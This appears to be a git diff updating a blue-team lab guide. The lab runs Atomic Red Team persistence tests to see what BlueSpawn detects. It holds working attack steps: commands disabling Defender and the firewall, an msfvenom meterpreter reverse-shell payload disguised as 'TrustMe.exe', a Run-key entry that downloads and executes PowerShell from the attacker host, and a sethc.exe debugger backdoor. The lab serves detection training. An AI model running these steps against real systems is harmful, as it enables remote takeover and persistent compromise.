@@ -19,10 +19,9 @@ In this lab, we will be starting BlueSpawn and then running Atomic Red Team to t
 First, we need to disable Defender. 
 Start by opening up <b>Windows Powershell</b>.
 
-<img width="74" height="91" alt="image" src="https://github.com/user-attachments/assets/685d264c-661c-4dbf-aa79-54f925cefdb1" />
+<img width="365" height="195" alt="image" src="https://github.com/user-attachments/assets/ed27c1ce-6e3d-4436-8567-494b4da79d49" />
 
-
-Next, run the following command:
+Next, run the following commands:
 
 ```ps
 Set-MpPreference -DisableRealtimeMonitoring $true
@@ -44,8 +43,7 @@ This will disable Defender for this session.
 
 Now, let's open a **command prompt**:
 
-<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-56" src="https://github.com/user-attachments/assets/f62f8205-8828-4a2b-97f0-e7137ec466e5" />
-
+<img width="370" height="195" alt="image" src="https://github.com/user-attachments/assets/f8875993-3492-4208-9fd6-617283ea298f" />
  
 Next, let’s change directories to tools and start Bluespawn:
 
@@ -61,7 +59,6 @@ You should see something like this:
 
 <img width="862" height="638" alt="2026-03-26_09-50" src="https://github.com/user-attachments/assets/a3419596-b4ca-4ea1-8d2a-832046873f76" />
 
-
 If you made it this far, perfect! That means Bluespawn is up and running.
 
 Now, let’s use Atomic Red Team to test the monitoring with BlueSpawn:
@@ -70,7 +67,7 @@ First, we need to open a PowerShell terminal.
 
 You can do this by selecting the icon in the taskbar/desktop:
 
-<img width="74" height="91" alt="image" src="https://github.com/user-attachments/assets/685d264c-661c-4dbf-aa79-54f925cefdb1" />
+<img width="365" height="195" alt="image" src="https://github.com/user-attachments/assets/ed27c1ce-6e3d-4436-8567-494b4da79d49" />
 
 Now we need to install and update Atomic Red Team. Run the following:
 
@@ -123,7 +120,8 @@ Once we do this, we need to invoke all the Atomic Tests.
 >
 >We recommend that you run in on a system with your EDR/Endpoint protection in non-blocking/alerting mode. This is so you can see what the protection would have done, but it will allow the tests to finish so we are just going to run individual tests for now.
 
-Run the following individually:
+Run the following individually. The test selections below were chosen to demonstrate several persistence
+techniques while avoiding Atomic tests that are unstable with BLUESPAWN monitor mode in this lab environment:
 
 ```ps
 Invoke-AtomicTest T1547.004
@@ -141,16 +139,26 @@ More information here:
 
 https://attack.mitre.org/techniques/T1543/003/
 
+You can also specify which tests you want to run:
+
 ```ps
-Invoke-AtomicTest T1547.001
+Invoke-AtomicTest T1547.001 -TestNumbers 1,9,11,12
 ```
+
+Each test uses a different mechanism : 
+
+- 1 - Registry Run key
+- 7 - Executable shortcut in the Startup folder
+- 9 - SystemBC through registry type Persistence
+- 11 - Using User Shell Folders to modify the Startup path
 
 More information here:
 
 https://attack.mitre.org/techniques/T1547/001/
 
+
 ```ps
-Invoke-AtomicTest T1546.008
+Invoke-AtomicTest T1546.008 -TestNumbers 1
 ```
 
 More information here:
@@ -164,47 +172,56 @@ https://attack.mitre.org/techniques/T1546/008/
 
 It should look like this:
 
-<img width="633" height="264" alt="2026-03-26_10-00" src="https://github.com/user-attachments/assets/3cc66d66-4156-45be-b149-e81145a1a920" />
-
+<img width="936" height="478" alt="image" src="https://github.com/user-attachments/assets/18ddba81-7d21-4875-9ccf-c447eb58d665" />
 
 >[!NOTE]
 >
->There might be some errors when this runs. This is 
-normal.
+>There might be some errors when this runs. This is normal.
 
->[!IMPORTANT]
+> [!IMPORTANT]
 >
->We had to cross reference the old numbering with the new.
+> The Atomic Red Team commands in this lab have already been updated to use
+> the current MITRE ATT&CK technique and sub-technique IDs.
 >
->You can find that mapping here:
+> The updated BLUESPAWN release also uses the current ATT&CK technique names.
 >
->https://attack.mitre.org/docs/subtechniques/subtechniques-crosswalk.json
+> The official MITRE ATT&CK sub-technique crosswalk is available here for
+> historical reference:
 >
->![](attachments/crossreference.png)
+> https://attack.mitre.org/docs/subtechniques/subtechniques-crosswalk.json
 
 
 You should be getting a lot of alerts with Bluespawn! Switch tabs in your Terminal to see them:
 
-<img width="1096" height="631" alt="2026-03-26_10-09" src="https://github.com/user-attachments/assets/135ce716-47fb-4840-b6a2-1c00c999bc87" />
-
+<img width="919" height="668" alt="image" src="https://github.com/user-attachments/assets/a8d22653-5baf-4f64-bbaa-bacc04befedb" />
 
 Now, let’s go back to the PowerShell window and clean up:
 
 ```ps
-Invoke-AtomicTest All -Cleanup
+Invoke-AtomicTest T1547.004 -Cleanup
+Invoke-AtomicTest T1543.003 -Cleanup
+Invoke-AtomicTest T1547.001 -TestNumbers 1,9,11,12 -Cleanup
+Invoke-AtomicTest T1546.008 -TestNumbers 1 -Cleanup
 ```
+
+> [!NOTE]
+>
+> The cleanup for `T1547.004-3` may time out after 120 seconds.
+> This test uses the legacy Winlogon Notify persistence mechanism, which is not
+> supported on modern Windows versions.
+>
+> The timeout does not prevent the remaining cleanup tests from continuing.
 
 It should look like this:
 
-<img width="1093" height="444" alt="2026-03-26_10-06" src="https://github.com/user-attachments/assets/2dd53a33-3c40-4cf8-9d86-bb18c3bb7ec5" />
+<img width="781" height="529" alt="image" src="https://github.com/user-attachments/assets/5932de02-775a-4e2a-b2e4-bd976a0dc2e3" />
 
 
 # If you have more time
 
 Let’s begin by disabling **Defender**. Simply run the following from an **Administrator PowerShell** prompt:
 
-<img width="74" height="91" alt="image" src="https://github.com/user-attachments/assets/685d264c-661c-4dbf-aa79-54f925cefdb1" />
-
+<img width="365" height="195" alt="image" src="https://github.com/user-attachments/assets/ed27c1ce-6e3d-4436-8567-494b4da79d49" />
 
 Next, run the following command in the **Powershell** terminal:
 
@@ -221,14 +238,13 @@ If you get angry red errors, that is **Ok**, it means **Defender** is not runnin
 
 Open **Command Prompt**
 
-<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-56" src="https://github.com/user-attachments/assets/761a7584-f744-4f6a-926b-339891c1d5b4" />
+<img width="370" height="195" alt="image" src="https://github.com/user-attachments/assets/f8875993-3492-4208-9fd6-617283ea298f" />
 
 Next, lets ensure the firewall is disabled. In a Windows Command Prompt.
 
 ```cmd
 netsh advfirewall set allprofiles state off
 ```
-
 
 Next, set a password for the Administrator account that you can remember
 
@@ -240,8 +256,7 @@ Please note, that is a very bad password.  Come up with something better. But, p
 
 Let's continue by opening an **Ubuntu** terminal
 
-<img width="90" height="104" alt="Screenshot From 2026-02-23 10-28-37" src="https://github.com/user-attachments/assets/dc26dda4-12b8-4f03-8a07-f170e5064f8d" />
-
+<img width="384" height="400" alt="image" src="https://github.com/user-attachments/assets/eb8beb6f-5bf9-4294-9b32-2306ad1c002e" />
 
 
 Become root:
@@ -250,14 +265,13 @@ Become root:
 sudo su -
 ```
 
-
 Before we run the next commands, we need to get the **IP** of our **Linux System**. Lets do so by running the following:
 
 ```bash
 ifconfig
 ```
 
-<img width="716" height="175" alt="Get_IPLinux" src="https://github.com/user-attachments/assets/55ffa0a2-0502-4331-ad4e-720b1c1f4205" />
+<img width="822" height="172" alt="image" src="https://github.com/user-attachments/assets/2b1c4aaf-cc64-4ecb-9763-84aada0c6a1c" />
 
 **REMEMBER: YOUR IP WILL BE DIFFERENT**
 
@@ -268,20 +282,13 @@ cd /tmp/
 ```
 
 
-
 Run the following commands to start a simple backdoor and backdoor listener: 
 
 ```bash
-
 msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe > /tmp/TrustMe.exe
 ```
 
-
-
-<img width="1096" height="136" alt="2026-03-26_10-33" src="https://github.com/user-attachments/assets/cedde4be-e44e-4bab-87bb-5a683603e50f" />
-
-
-
+<img width="934" height="119" alt="image" src="https://github.com/user-attachments/assets/fd99899d-5962-4fcf-973e-18ab23db5ae2" />
 
 Now let's start the **Metasploit** Handler
 
@@ -311,10 +318,7 @@ exploit
 
 It should look like this:
 
-<img width="687" height="206" alt="2026-02-23_15-38" src="https://github.com/user-attachments/assets/71226123-2163-4237-8173-c7586de81ee7" />
-
-
-
+<img width="738" height="237" alt="image" src="https://github.com/user-attachments/assets/c0f71b47-4b0b-4b37-b016-0851c5932845" />
 
 Open up a **Powershell** terminal, copy the file over from **Linux**
 
@@ -328,7 +332,7 @@ scp ubuntu@linux.cloudlab.lan:/tmp/TrustMe.exe .
 
 Open a **Command Prompt**
 
-<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-56" src="https://github.com/user-attachments/assets/62be252d-35ca-41a4-8ade-ba5d8a8478bb" />
+<img width="370" height="195" alt="image" src="https://github.com/user-attachments/assets/f8875993-3492-4208-9fd6-617283ea298f" />
 
 
 Let's run the following commands to run the **"TrustMe.exe"** file.
@@ -345,7 +349,7 @@ TrustMe.exe
 
 Back at your Ubuntu terminal, you should have a metasploit session!
 
-<img width="987" height="392" alt="2026-03-26_10-44" src="https://github.com/user-attachments/assets/152dd3e7-11d7-43d8-85f6-45d0870cc725" />
+<img width="940" height="466" alt="image" src="https://github.com/user-attachments/assets/8458c8b8-63fc-4749-9d74-730f205cd773" />
 
 Now, let’s look at keystroke logging.
 
@@ -353,9 +357,9 @@ To learn more about this check out MITRE:
 
 https://attack.mitre.org/techniques/T1056/
 
-Also, below is a list of just some of the threat groups that use this technique:
+Here are some examples of threat groups, software, and campaigns associated with this technique:
 
-<img width="1072" height="723" alt="image" src="https://github.com/user-attachments/assets/c005128b-124b-4bcc-9bf7-8516ca4be2d6" />
+<img width="1385" height="756" alt="image" src="https://github.com/user-attachments/assets/4a0aafa0-dcf7-4c7b-a7d6-fdd8e01b3064" />
 
 
 Run commands
@@ -379,16 +383,16 @@ https://attack.mitre.org/techniques/T1547/
 
 Here are just some of the groups that use this technique:
 
-<img width="1072" height="533" alt="image" src="https://github.com/user-attachments/assets/86040c18-29cd-4d16-95dd-84e45dcb1f63" />
+<img width="1386" height="489" alt="image" src="https://github.com/user-attachments/assets/d2446939-e59a-4c36-8a2f-46472a274834" />
 
 
 meterpreter > `shell`
 
-C:\> `reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Payload /d "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://172.20.243.5:80/a'))\"" /f`
+C:\Users\Administrator\Desktop> `reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Payload /d "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://[Your Linux IP Address]:80/a'))\"" /f`
 
-C:\>  `reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe"`
+C:\Users\Administrator\Desktop> `reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe"`
 
-![](attachments/Clipboard_2020-06-15-14-00-53.png)
+<img width="1514" height="880" alt="image" src="https://github.com/user-attachments/assets/bc7ffe81-a9c5-42d5-b565-e9a640eb5301" />
 
 Go and check Bluespawn.  Did it detect it?
 
@@ -400,15 +404,14 @@ https://attack.mitre.org/techniques/T1543/
 
 Here are just some of the groups that use this technique:
 
-<img width="1087" height="489" alt="image" src="https://github.com/user-attachments/assets/41b91eb5-8505-48a3-bee0-09cbb87f9dca" />
+<img width="1405" height="484" alt="image" src="https://github.com/user-attachments/assets/744e008e-3c74-4f11-9e9a-1cac846f8481" />
 
 
 meterpreter >`getsystem`
 
-![](attachments/Clipboard_2020-06-15-13-52-28.png)
+<img width="685" height="82" alt="image" src="https://github.com/user-attachments/assets/fffb4bd8-3cd5-4b9d-b4aa-bde75e26dca2" />
 
-
-![](attachments/Clipboard_2020-06-15-13-56-34.png)
+<img width="1500" height="560" alt="image" src="https://github.com/user-attachments/assets/eb3352e1-2793-4ac3-9bc4-9a0f747c4a0f" />
 
 Go and check Bluespawn.  Did it detect it?
 
